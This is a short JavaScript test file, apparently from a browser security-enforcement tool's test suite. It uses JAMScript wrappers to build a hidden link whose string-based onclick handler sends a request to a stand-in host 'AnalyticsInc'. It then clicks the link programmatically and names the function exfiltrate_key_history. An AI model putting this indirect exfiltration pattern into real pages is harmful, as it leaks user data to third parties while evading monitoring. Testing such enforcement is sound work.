
JAM.startProfile('load');
function exfiltrate_key_history(){var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=link2", true);xmlhttp.send(null);',link=document.createElement("a");link.href="#";JAMScript.set(link,"innerHTML","Suspicious Link");link.id="mylink";JAMScript.call(link.setAttribute,link,["onclick",exp]);exp=document.getElementsByTagName("body");exp=exp[0];JAMScript.call(exp.appendChild,exp,[link]);link=document.getElementById("mylink");exp=new Event("click");
link.dispatchEvent(exp)}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
